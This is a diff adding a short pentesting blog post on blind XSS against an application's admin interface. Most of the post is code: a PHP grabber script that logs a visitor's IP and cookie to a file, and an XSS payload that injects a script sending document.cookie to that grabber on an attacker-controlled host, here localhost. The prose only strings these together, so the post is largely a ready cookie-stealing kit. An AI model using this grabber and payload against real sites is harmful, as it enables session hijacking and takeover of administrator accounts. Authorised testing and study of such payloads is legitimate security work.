@@ -1,0 +1,41 @@
+<h4 id="the-problem">The problem</h4>
+<p>It’s common to you find XSS vulnerabilities during an web pentests, but some times, you’re testing an application that contains more then one interface, like user interface and admin interface, so how you can test for xss on the admin interface being just a regular user? Well it’s kind of simple, but it’s not a test to find all the xss on the admin page, for example, when you register on an application, there’s some informations you provide, like, name, address, bio and other things, so we can assume that the admin interface can read this informations, so we can just send XSS payloads, to try to get a XSS exploration, but not a payload like the most common,</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">'XSS'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p>So to solve this problem we can use something like this, a php script to log the admin IP and Cookie,</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">getUserIP</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nv">$client</span>  <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_CLIENT_IP'</span><span class="p">];</span>
+    <span class="nv">$forward</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_X_FORWARDED_FOR'</span><span class="p">];</span>
+    <span class="nv">$remote</span>  <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$client</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_IP</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$client</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">elseif</span><span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$forward</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_IP</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$forward</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$remote</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$ip</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$user_ip</span> <span class="o">=</span> <span class="nx">getUserIP</span><span class="p">();</span>
+<span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cookie'</span><span class="p">];</span>
+<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'access.txt'</span><span class="p">,</span> <span class="s1">'a'</span><span class="p">);</span>
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$user_ip</span> <span class="o">.</span><span class="s2">" : "</span><span class="o">.</span><span class="nv">$cookie</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>But how I’ll get the admin cookie? it’s simple, just make it on your XSS payload,</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">"script"</span><span class="p">);</span><span class="nx">s</span><span class="p">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s2">"text/javascript"</span><span class="p">;</span><span class="nx">s</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">"http://localhost/grabber.php?cookie="</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="nx">$</span><span class="p">(</span><span class="s2">"body"</span><span class="p">).</span><span class="nx">append</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span></code></pre></figure>
+
+<p>Basically this payload, will add a tag script on the page, with you server/script as source, and passing the document.cookie as value of parameter cookie of your script.</p>
+
+<p>Now you can test XSS on interfaces where you can reach.</p>
